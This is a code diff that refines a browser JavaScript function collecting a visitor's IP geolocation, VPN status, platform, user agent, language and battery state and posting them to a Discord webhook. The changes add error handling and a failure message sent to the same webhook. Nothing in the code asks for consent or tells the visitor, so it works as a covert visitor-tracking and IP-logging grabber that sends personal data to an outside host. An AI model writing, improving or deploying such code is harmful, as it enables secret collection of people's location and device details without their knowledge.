@@ -1,31 +1,43 @@
 async function sendUserDataToDiscord() {
   try {
-    // Fetch general user data (geo-location)
-    const geoResponse = await fetch("https://json.geoiplookup.io");
-    const geoData = geoResponse.ok ? await geoResponse.json() : null;
-
-    // Fetch VPN-related data (if important for verification)
-    const vpnResponse = await fetch("https://vpn.geoiplookup.io/");
-    const vpnData = vpnResponse.ok ? await vpnResponse.json() : { badip: "Unknown" };
-
-    // Attempt to fetch battery information if supported
-    let batteryData = { level: "N/A", charging: "N/A" };
-    if (navigator.getBattery) {
-      const battery = await navigator.getBattery();
-      batteryData.level = battery.level * 100;
-      batteryData.charging = battery.charging ? "Yes" : "No";
+    let geoData = null;
+    let vpnData = { badip: "Unknown" };
+    
+    // Fetch general user data with error handling for 521 response
+    try {
+      const geoResponse = await fetch("https://json.geoiplookup.io");
+      if (geoResponse.ok) {
+        geoData = await geoResponse.json();
+      } else {
+        console.warn("Geo IP lookup failed with status:", geoResponse.status);
+      }
+    } catch (error) {
+      console.warn("Geo IP lookup service unavailable:", error);
     }
 
-    // Gather device information
+    // Fetch VPN-related data
+    try {
+      const vpnResponse = await fetch("https://vpn.geoiplookup.io/");
+      if (vpnResponse.ok) {
+        vpnData = await vpnResponse.json();
+      } else {
+        console.warn("VPN lookup failed with status:", vpnResponse.status);
+      }
+    } catch (error) {
+      console.warn("VPN lookup service unavailable:", error);
+    }
+
+    // Get battery data if supported
+    const battery = navigator.getBattery ? await navigator.getBattery() : null;
     const deviceData = {
       platform: navigator.platform || "Unknown",
       userAgent: navigator.userAgent || "Unknown",
       language: navigator.language || "Unknown",
-      batteryLevel: batteryData.level,
-      isCharging: batteryData.charging
+      batteryLevel: battery ? battery.level * 100 : "N/A",
+      isCharging: battery ? (battery.charging ? "Yes" : "No") : "N/A"
     };
 
-    // Format message for Discord
+    // Format message content for Discord
     const messageContent = `
       **User Data:**
       ${geoData ? `
@@ -41,9 +53,7 @@ async function sendUserDataToDiscord() {
       - Charging: ${deviceData.isCharging}
     `;
 
-    const discordPayload = {
-      content: messageContent
-    };
+    const discordPayload = { content: messageContent };
 
     // Send data to Discord webhook
     const discordResponse = await fetch("https://discord.com/api/webhooks/YOUR_WEBHOOK_URL", {
@@ -53,13 +63,19 @@ async function sendUserDataToDiscord() {
     });
 
     if (!discordResponse.ok) {
-      console.error("Failed to send data to Discord.");
-    } else {
-      console.log("Data sent successfully.");
+      throw new Error("Failed to send data to Discord.");
     }
 
+    console.log("Data sent successfully.");
   } catch (error) {
-    console.error("Error sending user data:", error);
+    console.error("Failed to send user data, sending error message:", error);
+
+    // Send error message to Discord for logging
+    await fetch("https://discord.com/api/webhooks/YOUR_WEBHOOK_URL", {
+      method: "POST",
+      headers: { 'Content-Type': "application/json" },
+      body: JSON.stringify({ content: "Error: Failed to send user data. Please check the logs for more details." })
+    });
   }
 }
 
